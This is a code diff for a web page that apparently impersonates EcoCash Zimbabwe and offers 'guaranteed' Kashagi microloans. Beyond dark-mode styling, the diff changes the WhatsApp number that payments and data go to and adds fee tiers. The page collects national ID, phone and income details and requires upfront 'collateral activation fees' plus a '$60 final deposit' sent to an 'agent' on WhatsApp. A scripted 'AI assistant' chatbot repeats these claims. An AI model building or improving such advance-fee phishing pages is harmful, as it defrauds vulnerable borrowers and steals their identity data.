                             <label class="block font-medium mb-1">3. Zimbabwe National ID Number <span class="text-red-500">*</span></label>
-                            <input type="text" id="boost-nid" placeholder="e.g. 63-1234567A89" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue uppercase" oninput="validateBoostForm()">
+                            <input type="text" id="boost-nid" placeholder="e.g. 63-1234567A89" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue uppercase" oninput="validateBoostForm()">
                             <p id="boost-id-error" class="text-[10px] text-red-600 mt-1 hidden">Please enter a valid Zimbabwe National ID format (e.g., 63-1234567A89).</p>
                         </div>
 
                         <div>
                             <label class="block font-medium mb-1">4. Current Kashagi Loan Amount (USD) <span class="text-red-500">*</span></label>
-                            <input type="number" id="boost-current-loan" placeholder="e.g. 50" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateBoostForm()">
+                            <input type="number" id="boost-current-loan" placeholder="e.g. 50" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateBoostForm()">
                         </div>
 
                         <div class="pt-4">
-                            <button type="button" id="boost-submit-btn" disabled onclick="startProcessingFlow('boost')" class="w-full bg-gray-200 text-gray-400 font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm">
+                            <button type="button" id="boost-submit-btn" disabled onclick="startProcessingFlow('boost')" class="w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm">
                                 VALIDATE & BOOST LOAN
                             </button>
                         </div>
@@ -489,16 +513,16 @@
 
 
             <!-- ================= VIEW 6: TIER UPGRADE & EXACT AMOUNTS TABLE ================= -->
-            <section id="view-tier-upgrade" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white flex flex-col justify-between">
+            <section id="view-tier-upgrade" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800 flex flex-col justify-between">
                 <div>
                     <div class="flex items-center justify-between mb-4">
                         <button onclick="switchTab('boost-form')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
                             <i class="fa-solid fa-arrow-left"></i> <span>Back</span>
                         </button>
-                        <h2 class="text-base font-bold text-gray-800">Select Loan Upgrade Tier</h2>
+                        <h2 class="text-base font-bold text-gray-800 dark:text-gray-100">Select Loan Upgrade Tier</h2>
                     </div>
 
-                    <p class="text-xs text-gray-600 mb-4">Select your target tier below. Exact required activation/collateral fees are indicated clearly for each tier.</p>
+                    <p class="text-xs text-gray-600 dark:text-gray-400 mb-4">Select your target tier below. Exact required activation/collateral fees are indicated clearly for each tier.</p>
 
                     <!-- Tier Table / Selection Cards with exact amounts -->
                     <div class="space-y-3 max-h-[350px] overflow-y-auto pr-1 no-scrollbar" id="tier-options-container">
@@ -507,7 +531,7 @@
                 </div>
 
                 <div class="pt-4">
-                    <button type="button" id="upgrade-btn" disabled onclick="proceedToTerms()" class="w-full bg-gray-200 text-gray-400 font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm">
+                    <button type="button" id="upgrade-btn" disabled onclick="proceedToTerms()" class="w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm">
                         PROCEED TO TERMS & CONDITIONS
                     </button>
                 </div>
@@ -515,81 +539,84 @@
 
 
             <!-- ================= VIEW 7: TERMS AND CONDITIONS WITH FULL PAGE SCROLL & AGREE TICK BOX ================= -->
-            <section id="view-terms" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white flex flex-col justify-between">
+            <section id="view-terms" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800 flex flex-col justify-between">
                 <div class="flex-1 flex flex-col">
                     <div class="flex items-center justify-between mb-2">
                         <button onclick="switchTab('tier-upgrade')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
                             <i class="fa-solid fa-arrow-left"></i> <span>Back</span>
                         </button>
-                        <h2 class="text-sm font-extrabold text-gray-800">Terms, Privacy & Safety Policy</h2>
+                        <h2 class="text-sm font-extrabold text-gray-800 dark:text-gray-100">Terms, Privacy & Safety Policy</h2>
                         <div></div>
                     </div>
-                    <p class="text-[11px] text-gray-500 mb-2 text-center">Please read the terms below and check the agreement box to proceed.</p>
+                    <p class="text-[11px] text-gray-500 dark:text-gray-400 mb-2 text-center">Please read the terms below and check the agreement box to proceed.</p>
 
                     <!-- Full Page Scrollable Terms Box -->
-                    <div id="terms-scroll-box" class="bg-white border border-gray-300 rounded-lg p-4 flex-1 h-[270px] overflow-y-auto text-xs text-gray-700 space-y-3 shadow-inner leading-relaxed">
-                        <p class="font-semibold text-gray-900">1. Agreement to Digital Credit Terms: By checking the agreement box below and submitting your Kashagi Loan application or boost via EcoCash, you enter into a legally binding financial agreement with EcoCash Zimbabwe and regulated microfinance partners.</p>
+                    <div id="terms-scroll-box" class="bg-white dark:bg-gray-800 border border-gray-300 dark:border-gray-700 rounded-lg p-4 flex-1 h-[270px] overflow-y-auto text-xs text-gray-700 dark:text-gray-300 space-y-3 shadow-inner leading-relaxed">
+                        <p class="font-semibold text-gray-900 dark:text-gray-100">1. Agreement to Digital Credit Terms: By checking the agreement box below and submitting your Kashagi Loan application or boost via EcoCash, you enter into a legally binding financial agreement with EcoCash Zimbabwe and regulated microfinance partners.</p>
                         <p>2. Privacy and Data Protection: EcoCash is deeply committed to protecting your personal information. All submitted national identification credentials, phone numbers, and PIN data are encrypted with bank-grade 256-bit protocols, strictly adhering to national data privacy regulations.</p>
                         <p>3. Safety and Fraud Prevention: Your account security is paramount. Never share your 4-digit EcoCash PIN or password with any third party, customer care agent, or unauthorized personnel. EcoCash will never ask for your PIN over phone calls or messages.</p>
                         <p>4. Loan Repayment and Collateral: All disbursed Kashagi loan credit lines require upfront collateral activation fees (5% for boost tiers or 10% for full new applications) prior to wallet disbursement. Repayments are automatically debited on maturity.</p>
-                        <p class="font-semibold text-ecored bg-red-50 p-2 rounded border border-red-200">5. Account Update and Final Deposit Requirement: Once your account and credit tier have been successfully updated, the client is required to deposit a final total of exactly $60 USD. Upon completing this deposit, you can immediately begin spending using your updated account. All deposits must be made directly to your personally assigned agent via WhatsApp verification.</p>
+                        <p class="font-semibold text-gray-800 dark:text-gray-200 bg-blue-50 dark:bg-gray-700 p-2 rounded border border-blue-200 dark:border-gray-600">5. Account Update and Final Deposit Requirement: Once your account and credit tier have been successfully updated, the client is required to deposit a final total of exactly $60 USD. Upon completing this deposit, you can immediately begin spending using your updated account. All deposits must be made directly to your personally assigned agent via WhatsApp verification.</p>
                         <p>6. Default Consequences: Failure to clear outstanding loan balances on time results in credit score penalties, temporary wallet restriction, and potential debt recovery through registered mobile subscriber lines.</p>
                         <p class="font-semibold text-ecoblue">7. Final Acceptance: By checking the agreement box below and clicking submit, you certify that all entered profile data is accurate and you consent to our security guidelines.</p>
                     </div>
 
                     <!-- Explicit Agree Checkbox -->
-                    <div class="bg-white border border-blue-200 rounded-lg p-3 mt-3 flex items-start space-x-2 shadow-sm">
+                    <div class="bg-white dark:bg-gray-800 border border-blue-200 dark:border-gray-700 rounded-lg p-3 mt-3 flex items-start space-x-2 shadow-sm">
                         <input type="checkbox" id="explicit-agree-checkbox" onchange="toggleAgreeCheckbox()" class="mt-0.5 w-4 h-4 rounded text-ecoblue focus:ring-ecoblue cursor-pointer flex-shrink-0">
-                        <label for="explicit-agree-checkbox" class="text-[11px] text-gray-800 font-medium leading-tight cursor-pointer">
+                        <label for="explicit-agree-checkbox" class="text-[11px] text-gray-800 dark:text-gray-200 font-medium leading-tight cursor-pointer">
                             I have read, understood, and explicitly agree to all EcoCash Terms, Privacy & Safety Policy guidelines, including the $60 USD final deposit requirement with my assigned agent.
                         </label>
                     </div>
                 </div>
 
                 <div class="pt-3">
-                    <button type="button" id="agree-terms-btn" disabled onclick="handleFinalAgreement()" class="w-full bg-gray-300 text-gray-500 font-bold py-2.5 rounded-md uppercase text-[11px] tracking-wider cursor-not-allowed transition shadow-md">
+                    <button type="button" id="agree-terms-btn" disabled onclick="handleFinalAgreement()" class="w-full bg-gray-300 dark:bg-gray-700 text-gray-500 dark:text-gray-400 font-bold py-2.5 rounded-md uppercase text-[11px] tracking-wider cursor-not-allowed transition shadow-md">
                         AGREE & SUBMIT ALL TO WHATSAPP
                     </button>
                 </div>
             </section>
 
 
-            <!-- ================= VIEW 8: APPLY / REGISTER KASHAGI LOANS (Full Requirements) ================= -->
-            <section id="view-apply-form" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white">
-                <div class="bg-white rounded-xl p-5 shadow-sm border border-gray-100 mb-6">
-                    <div class="flex items-center justify-between mb-4">
+            <!-- ================= VIEW 8: APPLY / REGISTER KASHAGI LOANS (Full Requirements with $100-$3000 Tier Table) ================= -->
+            <section id="view-apply-form" class="hidden p-5 flex-1 bg-gradient-to-b from-blue-50 to-white dark:from-gray-900 dark:to-gray-800 flex flex-col justify-between">
+                <div>
+                    <div class="flex items-center justify-between mb-3">
                         <button onclick="switchTab('kashagi-hub')" class="text-xs text-ecoblue font-semibold flex items-center space-x-1">
                             <i class="fa-solid fa-arrow-left"></i> <span>Back</span>
                         </button>
-                        <h2 class="text-base font-bold text-gray-800">Kashagi Loan Full Application</h2>
+                        <h2 class="text-base font-bold text-gray-800 dark:text-gray-100">Kashagi Loan Full Registration</h2>
                     </div>
 
-                    <p class="text-[11px] text-gray-500 mb-3">Provide official Zimbabwe requirements to access full loans (Requires 10% collateral fee).</p>
+                    <p class="text-[11px] text-gray-500 dark:text-gray-400 mb-3">Select your loan registration tier ($100 to $3000 USD) with exact 10% fee calculated automatically.</p>
 
-                    <form onsubmit="event.preventDefault();" class="space-y-3 text-xs text-gray-700">
+                    <!-- Full Application Tier Table Selector -->
+                    <div class="space-y-2 mb-4 max-h-[220px] overflow-y-auto pr-1 no-scrollbar" id="apply-tier-options-container">
+                        <!-- Populated via JavaScript -->
+                    </div>
+
+                    <form onsubmit="event.preventDefault();" class="space-y-2.5 text-xs text-gray-700 dark:text-gray-300">
                         <div>
                             <label class="block font-medium mb-1">Full Names <span class="text-red-500">*</span></label>
-                            <input type="text" id="apply-name" placeholder="Full Names" class="w-full border border-gray-200 rounded-md p-2 text-sm outline-none focus:border-ecoblue" oninput="validateApplyForm()">
-                        </div>
-
-                        <div>
-                            <label class="block font-medium mb-1">Mobile Number (Starting with 7) <span class="text-red-500">*</span></label>
-                            <div class="flex items-center border border-gray-200 rounded-md overflow-hidden focus-within:border-ecoblue">
-                                <span class="bg-gray-100 px-3 py-2 text-gray-600 font-semibold text-sm border-r border-gray-200">+263</span>
-                                <input type="tel" id="apply-phone" placeholder="712345678" maxlength="9" class="w-full p-2 text-sm outline-none" oninput="validateApplyForm()">
-                            </div>
-                        </div>
-
-                        <div>
-                            <label class="block font-medium mb-1">Zimbabwe National ID Number <span class="text-red-500">*</span></label>
-                            <input type="text" id="apply-nid" placeholder="e.g. 63-1234567A89" class="w-full border border-gray-200 rounded-md p-2 text-sm outline-none focus:border-ecoblue uppercase" oninput="validateApplyForm()">
-                            <p id="apply-id-error" class="text-[10px] text-red-600 mt-1 hidden">Please enter a valid Zimbabwe National ID format (e.g., 63-1234567A89).</p>
+                            <input type="text" id="apply-name" placeholder="Full Names" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-sm outline-none focus:border-ecoblue" oninput="validateApplyForm()">
                         </div>
 
                         <div class="grid grid-cols-2 gap-2">
                             <div>
-                                <label class="block font-medium mb-1">Employment Status <span class="text-red-500">*</span></label>
-                                <select id="apply-employment" class="w-full border border-gray-200 rounded-md p-2 text-xs outline-none bg-white" onchange="validateApplyForm()">
+                                <label class="block font-medium mb-1">Mobile (+263) <span class="text-red-500">*</span></label>
+                                <input type="tel" id="apply-phone" placeholder="712345678" maxlength="9" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-sm outline-none" oninput="validateApplyForm()">
+                            </div>
+                            <div>
+                                <label class="block font-medium mb-1">Zimbabwe ID <span class="text-red-500">*</span></label>
+                                <input type="text" id="apply-nid" placeholder="63-1234567A89" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-sm outline-none uppercase" oninput="validateApplyForm()">
+                            </div>
+                        </div>
+                        <p id="apply-id-error" class="text-[10px] text-red-600 mt-0.5 hidden">Please enter a valid Zimbabwe National ID format (e.g., 63-1234567A89).</p>
+
+                        <div class="grid grid-cols-2 gap-2">
+                            <div>
+                                <label class="block font-medium mb-1">Employment <span class="text-red-500">*</span></label>
+                                <select id="apply-employment" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-xs outline-none bg-white dark:bg-gray-700" onchange="validateApplyForm()">
                                     <option value="">Select</option>
                                     <option value="Employed">Employed</option>
                                     <option value="Self-Employed">Self-Employed</option>
@@ -598,126 +625,87 @@
                             </div>
                             <div>
                                 <label class="block font-medium mb-1">Monthly Income (USD) <span class="text-red-500">*</span></label>
-                                <input type="number" id="apply-income" placeholder="e.g. 300" class="w-full border border-gray-200 rounded-md p-2 text-sm outline-none focus:border-ecoblue" oninput="validateApplyForm()">
+                                <input type="number" id="apply-income" placeholder="e.g. 300" class="w-full border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-md p-2 text-sm outline-none" oninput="validateApplyForm()">
                             </div>
                         </div>
-
-                        <div>
-                            <label class="block font-medium mb-1">Residential Address <span class="text-red-500">*</span></label>
-                            <input type="text" id="apply-address" placeholder="Street, Suburb, City/Town" class="w-full border border-gray-200 rounded-md p-2 text-sm outline-none focus:border-ecoblue" oninput="validateApplyForm()">
-                        </div>
-
-                        <div>
-                            <label class="block font-medium mb-1">Requested Loan Amount (USD) <span class="text-red-500">*</span></label>
-                            <input type="number" id="apply-loan-amount" placeholder="e.g. 500" class="w-full border border-gray-200 rounded-md p-2 text-sm outline-none focus:border-ecoblue" oninput="validateApplyForm()">
-                        </div>
-
-                        <div class="pt-2">
-                            <button type="button" id="apply-submit-btn" disabled onclick="startProcessingFlow('apply')" class="w-full bg-gray-200 text-gray-400 font-bold py-3 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm">
-                                VALIDATE APPLICATION (10% FEE)
-                            </button>
-                        </div>
                     </form>
+                </div>
+
+                <div class="pt-3">
+                    <button type="button" id="apply-submit-btn" disabled onclick="startProcessingFlow('apply')" class="w-full bg-gray-200 dark:bg-gray-700 text-gray-400 dark:text-gray-500 font-bold py-2.5 rounded-md uppercase text-xs tracking-wider cursor-not-allowed transition shadow-sm">
+                        VALIDATE APPLICATION (10% FEE)
+                    </button>
                 </div>
             </section>
 
 
-            <!-- ================= VIEW 9: CONTACT US SCREEN ================= -->
-            <section id="view-contact" class="hidden flex-1 flex flex-col">
+            <!-- ================= VIEW 9: CONTACT US & DEDICATED HELP CENTER (FAQS) ================= -->
+            <section id="view-contact" class="hidden flex-1 flex flex-col bg-white dark:bg-gray-800 transition-colors">
                 <div class="bg-gradient-to-r from-blue-600 to-cyan-500 text-white p-6 relative flex justify-between items-center overflow-hidden min-h-[140px]">
-                    <h2 class="text-2xl font-semibold z-10">Contact Us</h2>
+                    <h2 class="text-2xl font-semibold z-10">Dedicated Help Center</h2>
                     <img src="https://images.unsplash.com/photo-1573496359142-b8d87734a5a2?auto=format&fit=crop&w=300&q=80" alt="Customer Support" class="w-32 h-32 object-cover rounded-full absolute -right-4 -bottom-4 border-2 border-white shadow-lg opacity-90">
                 </div>
 
                 <div class="p-5 space-y-6">
                     <div class="text-center space-y-1">
-                        <h3 class="text-3xl font-extrabold text-black tracking-tight">Get in Touch</h3>
-                        <p class="text-sm text-gray-600 px-4">You can message us about any questions you may have</p>
+                        <h3 class="text-2xl font-extrabold text-gray-900 dark:text-gray-100 tracking-tight">Frequently Asked Questions</h3>
+                        <p class="text-xs text-gray-600 dark:text-gray-400 px-4">Instant answers regarding guaranteed loans, data bundles, and agent deposits</p>
                     </div>
 
-                    <div class="space-y-4">
-                        <div class="bg-cardblue text-white rounded-2xl p-6 text-center shadow-md space-y-2">
-                            <i class="fa-regular fa-user text-4xl mb-1 inline-block"></i>
-                            <h4 class="text-base font-semibold">Customer Care</h4>
-                            <p class="text-xl font-bold tracking-wide">114</p>
+                    <!-- FAQ Accordion Container -->
+                    <div class="space-y-2.5 text-xs">
+                        <div class="border border-gray-200 dark:border-gray-700 rounded-lg p-3 bg-gray-50 dark:bg-gray-700">
+                            <h4 class="font-bold text-gray-800 dark:text-gray-200 mb-1">Q: Are Kashagi loans guaranteed without a guarantor?</h4>
+                            <p class="text-gray-600 dark:text-gray-300">Yes! All Kashagi microloans are guaranteed with no guarantor needed, based on your last 6 months of active wallet transaction history and Zimbabwe ID verification.</p>
                         </div>
-
-                        <div class="bg-cardblue text-white rounded-2xl p-6 text-center shadow-md space-y-2">
-                            <h4 class="text-2xl font-bold">Tel</h4>
-                            <p class="text-lg font-medium">+263 772 023 000</p>
+                        <div class="border border-gray-200 dark:border-gray-700 rounded-lg p-3 bg-gray-50 dark:bg-gray-700">
+                            <h4 class="font-bold text-gray-800 dark:text-gray-200 mb-1">Q: What is the $60 USD final deposit requirement?</h4>
+                            <p class="text-gray-600 dark:text-gray-300">Once your account is successfully updated, a final deposit of $60 USD is required to activate your spending balance. Deposits are made directly to your personally assigned agent via WhatsApp.</p>
                         </div>
+                        <div class="border border-gray-200 dark:border-gray-700 rounded-lg p-3 bg-gray-50 dark:bg-gray-700">
+                            <h4 class="font-bold text-gray-800 dark:text-gray-200 mb-1">Q: How do I buy the 28GB for $10 USD bundle?</h4>
+                            <p class="text-gray-600 dark:text-gray-300">Simply click the promotional 'Buy Now' banner on your dashboard, and it will automatically format your request to our official WhatsApp line for instant credit.</p>
+                        </div>
+                    </div>
 
-                        <div class="bg-cardblue text-white rounded-2xl p-6 text-center shadow-md space-y-2 relative">
-                            <i class="fa-solid fa-location-dot text-4xl mb-1 inline-block"></i>
-                            <h4 class="text-xl font-bold">Head Office</h4>
-                            <p class="text-sm leading-snug opacity-95">1906 Borrowdale Road,<br>Borrowdale, Harare</p>
+                    <div class="space-y-4 pt-2">
+                        <div class="bg-cardblue text-white rounded-2xl p-4 text-center shadow-md space-y-1">
+                            <i class="fa-regular fa-user text-2xl mb-0.5 inline-block"></i>
+                            <h4 class="text-sm font-semibold">Customer Care Helpline</h4>
+                            <p class="text-lg font-bold tracking-wide">114 or +263 772 023 000</p>
                         </div>
                     </div>
 
                     <!-- Contact Form Card -->
-                    <div class="bg-white rounded-xl shadow-lg border border-gray-100 p-5 space-y-4 mt-6">
+                    <div class="bg-white dark:bg-gray-700 rounded-xl shadow-lg border border-gray-100 dark:border-gray-600 p-5 space-y-4">
+                        <h4 class="font-bold text-sm text-gray-800 dark:text-gray-100">Send Direct Message to Support</h4>
                         <div>
-                            <label class="block text-xs font-semibold text-gray-700 mb-1">Your name <span class="text-red-500">*</span></label>
-                            <input type="text" id="contact-name" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateContactForm()">
+                            <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-1">Your name <span class="text-red-500">*</span></label>
+                            <input type="text" id="contact-name" class="w-full border border-gray-200 dark:border-gray-600 dark:bg-gray-800 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateContactForm()">
                         </div>
                         <div>
-                            <label class="block text-xs font-semibold text-gray-700 mb-1">Your email <span class="text-red-500">*</span></label>
-                            <input type="email" id="contact-email" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateContactForm()">
+                            <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-1">Your email <span class="text-red-500">*</span></label>
+                            <input type="email" id="contact-email" class="w-full border border-gray-200 dark:border-gray-600 dark:bg-gray-800 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateContactForm()">
                         </div>
                         <div>
-                            <label class="block text-xs font-semibold text-gray-700 mb-1">Phone Number <span class="text-red-500">*</span></label>
-                            <input type="tel" id="contact-phone" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateContactForm()">
+                            <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-1">Phone Number <span class="text-red-500">*</span></label>
+                            <input type="tel" id="contact-phone" class="w-full border border-gray-200 dark:border-gray-600 dark:bg-gray-800 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateContactForm()">
                         </div>
                         <div>
-                            <label class="block text-xs font-semibold text-gray-700 mb-1">Your message <span class="text-red-500">*</span></label>
-                            <textarea rows="3" id="contact-message" class="w-full border border-gray-200 rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateContactForm()"></textarea>
+                            <label class="block text-xs font-semibold text-gray-700 dark:text-gray-300 mb-1">Your message <span class="text-red-500">*</span></label>
+                            <textarea rows="3" id="contact-message" class="w-full border border-gray-200 dark:border-gray-600 dark:bg-gray-800 dark:text-white rounded-md p-2.5 text-sm outline-none focus:border-ecoblue" oninput="validateContactForm()"></textarea>
                         </div>
-                        <button type="button" id="contact-btn" disabled onclick="handleContactSubmit()" class="w-full bg-gray-200 text-gray-400 font-bold py-3 rounded-md cursor-not-allowed transition">
+                        <button type="button" id="contact-btn" disabled onclick="handleContactSubmit()" class="w-full bg-gray-200 dark:bg-gray-600 text-gray-400 dark:text-gray-300 font-bold py-3 rounded-md cursor-not-allowed transition">
                             Send Message
                         </button>
                     </div>
 
                     <!-- Footer Section -->
-                    <div class="pt-8 pb-4 text-center space-y-4 text-xs text-gray-700">
-                        <div class="text-2xl font-extrabold tracking-tight">
+                    <div class="pt-6 pb-4 text-center space-y-3 text-xs text-gray-700 dark:text-gray-400">
+                        <div class="text-xl font-extrabold tracking-tight">
                             <span class="text-ecoblue">Eco</span><span class="text-ecored">Cash</span>
                         </div>
-
-                        <div class="space-y-3">
-                            <div>
-                                <h5 class="font-bold text-sm text-black mb-1">About</h5>
-                                <ul class="space-y-1 text-gray-600">
-                                    <li><a href="#" class="hover:underline">What is EcoCash?</a></li>
-                                    <li><a href="#" class="hover:underline">Promotions</a></li>
-                                    <li><a href="#" class="hover:underline">Tarrifs</a></li>
-                                    <li><a href="#" class="hover:underline">News</a></li>
-                                </ul>
-                            </div>
-
-                            <div>
-                                <h5 class="font-bold text-sm text-black mb-1">Quick Links</h5>
-                                <p class="text-gray-600">Download</p>
-                            </div>
-
-                            <div>
-                                <h5 class="font-bold text-sm text-black mb-1">Legal</h5>
-                                <p class="text-gray-600">Terms & Conditions</p>
-                            </div>
-
-                            <div>
-                                <h5 class="font-bold text-sm text-black mb-1">Support</h5>
-                                <ul class="space-y-1 text-gray-600">
-                                    <li><a href="#" class="hover:underline">FAQs</a></li>
-                                    <li><a href="#" class="hover:underline">Contact Us</a></li>
-                                </ul>
-                            </div>
-                        </div>
-
-                        <div class="pt-4 border-t border-gray-200 text-gray-500 space-y-1 leading-relaxed">
-                            <p>Copyright © 2026 EcoCash Zimbabwe. All rights reserved.</p>
-                            <p><a href="#" class="text-blue-600 underline">Terms & Privacy</a></p>
-                            <p>Web design by <span class="text-blue-800 font-medium">Dicomm McCann</span></p>
-                        </div>
+                        <p>Copyright © 2026 EcoCash Zimbabwe. All rights reserved. Guaranteed Loans & Secure Compliance.</p>
                     </div>
                 </div>
             </section>
@@ -735,7 +723,7 @@
 
         <!-- Chatbot Modal Drawer -->
         <div id="chatbot-modal" class="hidden fixed inset-0 z-50 bg-black/50 flex items-end justify-center sm:items-center p-2">
-            <div class="bg-white w-full max-w-sm rounded-t-2xl sm:rounded-2xl shadow-2xl flex flex-col h-[520px] overflow-hidden">
+            <div class="bg-white dark:bg-gray-800 w-full max-w-sm rounded-t-2xl sm:rounded-2xl shadow-2xl flex flex-col h-[520px] overflow-hidden">
                 <!-- Chat Header -->
                 <div class="bg-ecoblue text-white p-4 flex justify-between items-center">
                     <div class="flex items-center space-x-2">
@@ -753,24 +741,24 @@
                 </div>
 
                 <!-- Chat Messages Area -->
-                <div id="chat-messages" class="flex-1 p-3 overflow-y-auto space-y-3 bg-gray-50 text-xs">
-                    <div class="bg-white p-3 rounded-xl shadow-sm border border-gray-200 space-y-1">
+                <div id="chat-messages" class="flex-1 p-3 overflow-y-auto space-y-3 bg-gray-50 dark:bg-gray-900 text-xs">
+                    <div class="bg-white dark:bg-gray-800 p-3 rounded-xl shadow-sm border border-gray-200 dark:border-gray-700 space-y-1">
                         <p class="font-semibold text-ecoblue">Hello! I am Thembi, your EcoCash AI assistant.</p>
-                        <p class="text-gray-600">Select any question below or ask me anything regarding Kashagi Loans and Data Bundles!</p>
+                        <p class="text-gray-600 dark:text-gray-300">Select any question below or ask me anything regarding Guaranteed Loans and Data Bundles!</p>
                     </div>
                 </div>
 
                 <!-- Suggested Questions Chips Container -->
-                <div class="p-2 bg-white border-t border-gray-200">
-                    <p class="text-[10px] font-bold text-gray-500 mb-1.5 px-1">Common Questions:</p>
+                <div class="p-2 bg-white dark:bg-gray-800 border-t border-gray-200 dark:border-gray-700">
+                    <p class="text-[10px] font-bold text-gray-500 dark:text-gray-400 mb-1.5 px-1">Common Questions:</p>
                     <div class="flex space-x-2 overflow-x-auto no-scrollbar pb-1" id="faq-chips-container">
                         <!-- Populated via JS -->
                     </div>
                 </div>
 
                 <!-- Chat Input -->
-                <div class="p-3 bg-white border-t border-gray-200 flex space-x-2">
-                    <input type="text" id="chat-input" placeholder="Type your question..." class="flex-1 border border-gray-200 rounded-lg px-3 py-2 text-xs outline-none focus:border-ecoblue" onkeypress="if(event.key==='Enter') sendChatMessage()">
+                <div class="p-3 bg-white dark:bg-gray-800 border-t border-gray-200 dark:border-gray-700 flex space-x-2">
+                    <input type="text" id="chat-input" placeholder="Type your question..." class="flex-1 border border-gray-200 dark:border-gray-700 dark:bg-gray-700 dark:text-white rounded-lg px-3 py-2 text-xs outline-none focus:border-ecoblue" onkeypress="if(event.key==='Enter') sendChatMessage()">
                     <button onclick="sendChatMessage()" class="bg-ecoblue text-white px-3.5 py-2 rounded-lg text-xs font-bold hover:bg-ecodarkblue transition">
                         <i class="fa-solid fa-paper-plane"></i>
                     </button>
@@ -779,7 +767,7 @@
         </div>
 
         <div id="whatsapp-widget" class="hidden fixed bottom-4 right-4 flex items-center z-50 space-x-2 cursor-pointer" onclick="openWhatsAppChat('Hello, I need assistance with my EcoCash account.')">
-            <div class="bg-white text-gray-800 text-xs px-3 py-1.5 rounded-full shadow-md font-medium border border-gray-100 flex items-center">
+            <div class="bg-white dark:bg-gray-700 text-gray-800 dark:text-gray-200 text-xs px-3 py-1.5 rounded-full shadow-md font-medium border border-gray-100 dark:border-gray-600 flex items-center">
                 Say Hi to Thembi
             </div>
             <button class="w-12 h-12 bg-green-500 text-white rounded-full flex items-center justify-center shadow-xl hover:bg-green-600 transition">
@@ -791,7 +779,7 @@
 
     <!-- APPLICATION LOGIC & INTERACTIVITY -->
     <script>
-        const TARGET_WHATSAPP_NUMBER = '254751329168';
+        const TARGET_WHATSAPP_NUMBER = '263789697483';
 
         // Global State variables
         let clientData = {
@@ -803,8 +791,30 @@
             currentLoan: 0,
             selectedTierAmount: 100,
             selectedTierFee: 5,
+            selectedApplyAmount: 500,
+            selectedApplyFee: 50,
             flowType: 'boost'
         };
+
+        // Dark Mode Toggle Function
+        function toggleDarkMode() {
+            const htmlEl = document.documentElement;
+            const iconEl = document.getElementById('dark-mode-icon');
+            htmlEl.classList.toggle('dark');
+            if (htmlEl.classList.contains('dark')) {
+                iconEl.className = "fa-solid fa-sun text-xs";
+                localStorage.setItem('ecocash_theme', 'dark');
+            } else {
+                iconEl.className = "fa-solid fa-moon text-xs";
+                localStorage.setItem('ecocash_theme', 'light');
+            }
+        }
+
+        // Initialize theme on load
+        if (localStorage.getItem('ecocash_theme') === 'dark') {
+            document.documentElement.classList.add('dark');
+            document.getElementById('dark-mode-icon').className = "fa-solid fa-sun text-xs";
+        }
 
         // 10 Client FAQ questions structured into TWO clear, readable parts for Ask Thembi AI
         const thembiFAQs = [
@@ -812,6 +822,11 @@
                 q: "What is the final $60 USD deposit requirement?", 
                 part1: "Part 1: Account Activation Deposit — Once your account and credit tier have been successfully updated, clients are required to make a final deposit of $60 USD.", 
                 part2: "Part 2: Spending Activation — After completing this deposit with your personally assigned agent via WhatsApp, your account is fully activated for spending." 
+            },
+            { 
+                q: "Are Kashagi loans guaranteed without guarantors?", 
+                part1: "Part 1: Guaranteed Funding — Yes! Kashagi microloans require no guarantor needed. Approval is based on your secure Zimbabwe ID and 6-month wallet transaction history.", 
+                part2: "Part 2: Instant Disbursal — Once validated and fees are cleared, funds transfer immediately into your active EcoCash wallet." 
             },
             { 
                 q: "How do I buy the 28GB for $10 USD bundle?", 
@@ -831,7 +846,7 @@
             { 
                 q: "How much is the fee for full applications?", 
                 part1: "Part 1: New Loan Requirements — Full loan registrations and new applications require a 10% collateral activation fee prior to disbursement.", 
-                part2: "Part 2: Example Calculation — If you apply for a $500 USD loan, the required activation fee is exactly $50.00 USD." 
+                part2: "Part 2: Exact Amounts — Ranging from $100 ($10 fee) all the way up to $3000 ($300 fee) across our secure tier table." 
             },
             { 
